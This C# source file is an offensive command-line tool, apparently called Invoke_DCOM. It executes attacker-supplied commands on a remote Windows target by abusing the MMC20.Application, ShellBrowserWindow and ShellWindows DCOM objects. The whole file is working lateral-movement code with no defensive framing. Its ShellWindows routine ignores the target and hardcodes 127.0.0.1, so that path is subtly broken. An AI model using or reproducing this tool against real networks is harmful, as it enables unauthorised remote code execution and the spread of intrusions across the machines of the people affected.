using System;
using System.Net;
using PowerArgs;

namespace Invoke_DCOM
{
    public class ExecArgs
    {
        [HelpHook, ArgShortcut("-?")]
        public bool Help { get; set; }

        [ArgShortcut("-m"), ArgDescription("DCOM Method to execute - MMC || ShellBrowserWindow || ShellWindows"), ArgRequired()]
        public string Method { get; set; }

        [ArgShortcut("-t"), ArgDescription("Hostname or IP Address of the target."), ArgRequired()]
        public string Target { get; set; }

        [ArgShortcut("-a"), ArgDescription("Arguments to add to command.")]
        public string Arguments { get; set; }

        [ArgShortcut("-c"), ArgDescription("Command to execute on the target."), ArgRequired()]
        public string Command { get; set; }

        [ArgShortcut("-e"), ArgDescription("Directory path of executable, e.g. c:\\windows\\")]
        public string ExeLocation { get; set; }
    }
    public class Program
    {
        public static void Main(string[] args)
        {
            ExecArgs parsed = null;
            try
            {
                parsed = Args.Parse<ExecArgs>(args);
                Console.WriteLine($"\n[+] DCOM -> {parsed.Target}");
                Console.WriteLine($" [>] Method -> {parsed.Method}");
                Console.WriteLine($" [>] Command -> {parsed.Command}");
                Console.WriteLine($" [>] Exe Location -> {parsed.ExeLocation}");
            }
            catch (MissingArgException e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine("Missing Required Parameter!");
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            try
            {
                if (parsed.Method.ToLower() == "mmc")
                {
                    MMC(parsed.Target, parsed.Command, parsed.Arguments);
                }
                if (parsed.Method.ToLower() == "shellbrowserwindow")
                {
                    ShellBrowserWindow(parsed.Target, parsed.Command, parsed.ExeLocation, parsed.Arguments);
                }
                if (parsed.Method.ToLower() == "shellwindows")
                {
                    ShellWindows(parsed.Target, parsed.Command, parsed.ExeLocation, parsed.Arguments);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

        }

        static void MMC(string hostname, string command, string args)
        {
            dynamic c = Activator.CreateInstance(Type.GetTypeFromProgID("MMC20.Application", $"{hostname}"));
            c.Document.ActiveView.ExecuteShellCommand($"{command}", null, $"{args}", "7");
        }

        static void ShellBrowserWindow(string hostname, string command, string exelocation, string args)
        {
            Type com = Type.GetTypeFromCLSID(Guid.Parse("C08AFD90-F2A1-11D1-8455-00A0C91F3880"), $"{hostname}");
            dynamic obj = System.Activator.CreateInstance(com);
            obj.Document.Application.ShellExecute($"{command}", $"{args}", $"{exelocation}", null, 0);
        }

        static void ShellWindows(string hostname, string command, string exelocation, string args)
        {
            Type com = Type.GetTypeFromCLSID(Guid.Parse("9BA05972-F6A8-11CF-A442-00A0C90A8F39"), "127.0.0.1");
            dynamic obj = System.Activator.CreateInstance(com);
            obj.Item().Document.Application.ShellExecute($"{command}", $"{args}", $"{exelocation}", null, 0);
        }
    }
}
